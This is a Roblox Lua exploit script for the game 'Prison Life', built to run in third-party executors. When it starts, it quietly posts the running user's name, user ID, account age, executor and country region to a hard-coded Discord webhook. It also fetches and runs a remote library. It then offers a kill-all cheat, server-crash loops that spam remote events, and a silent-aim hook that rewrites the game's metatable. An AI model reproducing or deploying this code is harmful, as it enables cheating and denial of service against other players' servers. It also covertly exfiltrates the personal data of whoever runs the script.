local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local LocalizationService = game:GetService("LocalizationService")
 
-- Function to get the exploit being used
local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
        (isexecutorclosure and "Script-Ware V2") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "SirHurt V4") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()['CalamariLuaEnv'] and "Calamari") or
        (unit and "Unit") or
        ("Undetectable")
    return exploit
end
 
-- Placeholder for alternative information
local playerDevice = "Unknown Device"
local playerUserAgent = "Not Available"
 
-- Get the player's avatar image URL
local avatarUrl = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username=" .. plr.Name
 
-- Function to get the player's IP region
local function getIPRegion()
    local success, region = pcall(function()
        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
    end)
    return success and region or "Unknown"
end
 
-- Content for the webhook message
local Content = 'Someone just got banned!'
local Embed = {
    ["title"] = "__**New execution.**__",
    ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
    ["type"] = "rich",
    ["color"] = tonumber(0xffff00),
    ["thumbnail"] = {
        ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
    },
    ["image"] = {
        ["url"] = avatarUrl
    },
    ["fields"] = {
        {
            ["name"] = "__Account Age:__",
            ["value"] = plr.AccountAge.." days old",
            ["inline"] = true
        },
        {
            ["name"] = "__User ID:__",
            ["value"] = plr.UserId,
            ["inline"] = true
        },
        {
            ["name"] = "__Device Info:__",
            ["value"] = playerDevice,
            ["inline"] = true
        },
        {
            ["name"] = "__User Agent:__",
            ["value"] = playerUserAgent,
            ["inline"] = true
        },
        {
            ["name"] = "__IP Region:__",
            ["value"] = getIPRegion(),
            ["inline"] = true
        }
    },
    ["footer"] = {
        ["text"] = "Simple banwave",
        ["icon_url"] = "https://i.imgur.com/Vz2XUGj.jpg"
    },
    ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
 
-- Send the webhook message
(syn and syn.request or http_request or http.request) {
    Url = 'https://discord.com/api/webhooks/1278322577261068288/4hbvotG7N5inOdvfliX9-PZ2GbAFxxXr4h2agku2Yo6SDtPfbWF-Q9I_y645WlWbXsuM';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    },
    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/turtle"))()

local OwO = library:Window("Prison Life")

OwO:Label("Admin Commands", Color3.fromRGB(127, 143, 166))

local toggleKillAll = false
local killAllConnection

OwO:Toggle("Kill All V1", false, function(bool)
    toggleKillAll = bool
    if toggleKillAll then
        -- Start the loop when the toggle is on
        killAllConnection = game:GetService("RunService").Stepped:Connect(function()
            for i, v in next, game:GetService("Players"):GetChildren() do
                pcall(function()
                    if v ~= game:GetService("Players").LocalPlayer and not v.Character:FindFirstChildOfClass("ForceField") and v.Character.Humanoid.Health > 0 then
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                        game.ReplicatedStorage.meleeEvent:FireServer(v)
                    end
                end)
                wait(0.1)
            end
        end)
    else
        -- Stop the loop when the toggle is off
        if killAllConnection then
            killAllConnection:Disconnect()
        end
    end
end)

OwO:Label("Server Commands", Color3.fromRGB(127, 143, 166))

local toggleCrashV1 = false
local runServiceConnection

OwO:Toggle("Crash Server V1", false, function(bool)
    toggleCrashV1 = bool
    if toggleCrashV1 then
        -- Start the loop when the toggle is on
        runServiceConnection = game:GetService("RunService").RenderStepped:Connect(function()
            local args1 = { [1] = "Bright orange" }
            local args2 = { [1] = "Bright blue" }
            workspace.Remote.TeamEvent:FireServer(unpack(args1))
            workspace.Remote.TeamEvent:FireServer(unpack(args2))
            wait(0.001)  -- Wait for 1 millisecond (approximate)
        end)
    else
        -- Stop the loop when the toggle is off
        if runServiceConnection then
            runServiceConnection:Disconnect()
        end
    end
end)

OwO:Button("Crash Server V2", function()
    -- Made By Jake11price --
    -- Crash Server --
    local Gun = "Remington 870"
    local Player = game.Players.LocalPlayer.Name

    -- Give the player the gun
    game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)

    -- Move the gun from the backpack to the character
    for i, v in pairs(game.Players[Player].Backpack:GetChildren()) do
        if v.Name == Gun then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end

    Gun = game.Players[Player].Character[Gun]

    -- Unequip all tools
    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()

    -- Function to fire the gun
    local function FireGun(target)
        coroutine.resume(coroutine.create(function()
            local bulletTable = {}
            table.insert(bulletTable, {
                Hit = target,
                Distance = 100,
                Cframe = CFrame.new(0,1,1),
                RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
            })
            game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
            wait()
        end))
    end

    -- Continuously fire the gun in a loop
    while game:GetService("RunService").Stepped:wait() do
        for count = 0, 10, 10 do
            FireGun()
        end
    end
end)

local OwO = library:Window("Scripts")

-- First Dropdown: Police
local dropdown1 = OwO:Dropdown("Police", {"Select Police"}, function(name)
   if name == "Select Police" then
       local args = {
           [1] = "Bright blue"
       }
       workspace.Remote.TeamEvent:FireServer(unpack(args))
       print("Police team selected with color: Bright blue")
   end
end)

-- Second Dropdown: Prisoner
local dropdown2 = OwO:Dropdown("Prisoner", {"Select Prisoner"}, function(name)
   if name == "Select Prisoner" then
       local args = {
           [1] = "Bright orange"
       }
       workspace.Remote.TeamEvent:FireServer(unpack(args))
       print("Prisoner team selected with color: Bright orange")
   end
end)

OwO:Label("Aim System", Color3.fromRGB(127, 143, 166))

OwO:Button("Bullet Tracking", function()
local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
function ClosestChar()
    local Max, Close = math.huge
    for I,V in pairs(GetPlayers(Players)) do
        if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
            local Head = FindFirstChild(V.Character, "Head")
            if Head then
                local Pos, OnScreen = WTSP(Camera, Head.Position)
                if OnScreen then
                    local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
                    if Dist < Max then
                        Max = Dist
                        Close = V.Character
                    end
                end
            end
        end
    end
    return Close
end
 
local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod()
    if Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
        local Character = ClosestChar()
        if Character then
            return Character.Head, Character.Head.Position
        end
    end
 
    return __namecall(self, ...)
end)
setreadonly(MT, true)
end)

-- Define a variable to control the loop
local isLoopActive = false
local loopConnection

-- The toggle function to start/stop the loop and reset the character
OwO:Toggle("Crash Server V2", false, function(bool)
    isLoopActive = bool

    if isLoopActive then
        -- Made By Jake11price --
        -- Crash Server --
        local Gun = "Remington 870"
        local Player = game.Players.LocalPlayer.Name

        -- Give the player the gun
        game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)

        -- Move the gun from the backpack to the character
        for i, v in pairs(game.Players[Player].Backpack:GetChildren()) do
            if v.Name == Gun then
                v.Parent = game.Players.LocalPlayer.Character
            end
        end

        Gun = game.Players[Player].Character[Gun]

        -- Unequip all tools
        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()

        -- Function to fire the gun
        local function FireGun(target)
            coroutine.resume(coroutine.create(function()
                local bulletTable = {}
                table.insert(bulletTable, {
                    Hit = target,
                    Distance = 100,
                    Cframe = CFrame.new(0,1,1),
                    RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
                })
                game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
                wait()
            end))
        end

        -- Continuously fire the gun in a loop
        loopConnection = game:GetService("RunService").Stepped:Connect(function()
            if isLoopActive then
                for count = 0, 10, 10 do
                    FireGun()
                end
            end
        end)
    else
        -- Stop the loop by disconnecting the connection
        if loopConnection then
            loopConnection:Disconnect()
            loopConnection = nil
        end

        -- Reset the character by changing the team color
        local args = {
            [1] = "Bright blue"
        }
        workspace.Remote.TeamEvent:FireServer(unpack(args))
    end
end)
